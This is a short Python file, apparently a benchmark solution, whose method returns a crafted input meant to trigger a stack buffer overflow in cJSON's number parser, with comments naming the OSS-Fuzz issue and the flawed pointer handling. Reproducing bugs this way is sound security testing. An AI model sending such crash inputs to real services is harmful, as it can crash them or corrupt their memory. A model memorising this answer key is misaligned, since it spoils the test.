class Solution:
    def solve(self, src_path: str) -> bytes:
        # Triggers cJSON parse_number stack buffer overflow (OSS-Fuzz 42534949)
        # Vulnerability: incorrect pointer advancement for leading minus when not Infinity
        return b"-InfinAAAAAAAAAA"